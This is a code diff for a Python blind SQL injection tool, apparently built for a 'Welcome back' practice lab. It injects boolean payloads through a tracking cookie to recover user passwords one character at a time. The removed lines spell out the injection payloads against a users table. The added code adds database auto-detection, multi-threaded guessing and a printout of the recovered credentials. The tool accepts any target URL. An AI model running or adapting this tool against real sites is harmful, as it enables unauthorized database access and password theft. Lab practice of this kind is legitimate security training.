@@ -11,7 +11,8 @@ try:
         build_charset, make_session, make_proxies, timestamp_log_name,
         prompt_url, prompt_tracking, prompt_cookie_name, prompt_session_cookie,
         prompt_users, prompt_length, prompt_proxy, prompt_workers,
-        prompt_special, prompt_timeout
+        prompt_special, prompt_timeout, prompt_dbms,
+        build_boolean_payload, build_boolean_probe, AUTO_DETECT_ORDER,
     )
 except ImportError:
     from common import (
@@ -19,7 +20,8 @@ except ImportError:
         build_charset, make_session, make_proxies, timestamp_log_name,
         prompt_url, prompt_tracking, prompt_cookie_name, prompt_session_cookie,
         prompt_users, prompt_length, prompt_proxy, prompt_workers,
-        prompt_special, prompt_timeout
+        prompt_special, prompt_timeout, prompt_dbms,
+        build_boolean_payload, build_boolean_probe, AUTO_DETECT_ORDER,
     )
 
 
@@ -41,18 +43,7 @@ class BooleanSQLiEngine:
         self.charset = build_charset(self.use_special)
         self.session = make_session()
         self.success_indicator = getattr(args, "success_indicator", "Welcome back")
-
-    def _build_char_payload(self, user, position, char):
-        return (
-            f"{self.base_id}' and (select substring(password,{position},1) "
-            f"from users where username='{user}')='{char}'--"
-        )
-
-    def _build_probe_payload(self, user):
-        return (
-            f"{self.base_id}' and (select username from users "
-            f"where username='{user}' and LENGTH(password)>1)='{user}'--"
-        )
+        self.dbms = (getattr(args, "dbms", "auto") or "auto").lower()
 
     def _send_request(self, payload):
         cookies = {self.cookie_name: payload}
@@ -69,10 +60,23 @@ class BooleanSQLiEngine:
             self.logger.debug(f"Request failed: {e}")
             return False
 
+    def _detect_dbms(self, user):
+        log_info("Auto-detecting DBMS...")
+        for dbms in AUTO_DETECT_ORDER:
+            payload = build_boolean_probe(dbms, self.base_id, user)
+            if self._send_request(payload):
+                log_info(f"Detected DBMS: {Fore.CYAN}{dbms}{Style.RESET_ALL}")
+                return dbms
+        log_warn("Auto-detect failed; falling back to 'mysql'.")
+        return "mysql"
+
     def _probe(self, user):
         log_info("Probing Boolean-based injection...")
-        if self._send_request(self._build_probe_payload(user)):
-            log_info(f"Boolean payload confirmed (indicator: '{self.success_indicator}')")
+        if self.dbms == "auto":
+            self.dbms = self._detect_dbms(user)
+        payload = build_boolean_probe(self.dbms, self.base_id, user)
+        if self._send_request(payload):
+            log_info(f"Boolean payload confirmed (indicator: '{self.success_indicator}', dbms: {self.dbms})")
             return True
         log_error("Boolean probe failed. Check URL/cookie/session or success indicator.")
         return False
@@ -82,7 +86,8 @@ class BooleanSQLiEngine:
         with ThreadPoolExecutor(max_workers=self.workers) as ex:
             futs = {}
             for c in self.charset:
-                futs[ex.submit(self._send_request, self._build_char_payload(user, position, c))] = c
+                p = build_boolean_payload(self.dbms, self.base_id, user, position, c)
+                futs[ex.submit(self._send_request, p)] = c
             for fut in as_completed(futs):
                 c = futs[fut]
                 try:
@@ -129,7 +134,7 @@ class BooleanSQLiEngine:
 
     def _summary(self, results):
         print(f"\n{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
-        print(f"{Fore.MAGENTA} FINAL RESULTS — BOOLEAN MODE {Style.RESET_ALL}")
+        print(f"{Fore.MAGENTA} FINAL RESULTS — BOOLEAN MODE ({self.dbms}) {Style.RESET_ALL}")
         print(f"{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
         for u, p in results.items():
             print(f"{Fore.CYAN}{u:15} {Style.RESET_ALL} : {Fore.GREEN}{p}{Style.RESET_ALL}")
@@ -147,6 +152,7 @@ def interactive():
     args.session = prompt_session_cookie()
     args.users = prompt_users()
     args.length = prompt_length()
+    args.dbms = prompt_dbms()
     args.proxy = prompt_proxy()
     args.workers = prompt_workers(default=1)
     args.timeout = prompt_timeout()
@@ -157,7 +163,7 @@ def interactive():
 
 
 def build_parser():
-    p = argparse.ArgumentParser(description="Boolean-based Blind SQLi (Welcome back lab)")
+    p = argparse.ArgumentParser(description="Boolean-based Blind SQLi (Welcome back lab)", add_help=False)
     p.add_argument("-u", "--url", required=True)
     p.add_argument("-t", "--tracking", default="182--")
     p.add_argument("-c", "--cookie", default="TrackingId")
@@ -169,6 +175,7 @@ def build_parser():
     p.add_argument("-T", "--timeout", type=int, default=15)
     p.add_argument("-s", "--special", action="store_true")
     p.add_argument("-o", "--log", default=timestamp_log_name("boolean_sqli"))
+    p.add_argument("-db", "--dbms", default="auto", choices=["auto", "mysql", "postgres", "oracle", "mssql", "sqlite"])
     p.add_argument("--success-indicator", default="Welcome back", help="Success string in response")
     return p
 
@@ -182,7 +189,6 @@ def main():
     if not args.url.startswith(("http://", "https://")):
         log_error("URL must start with http:// or https://")
         sys.exit(1)
-
     if not args.length or args.length <= 0:
         log_error("Password length (-l) is required and must be positive.")
         sys.exit(1)
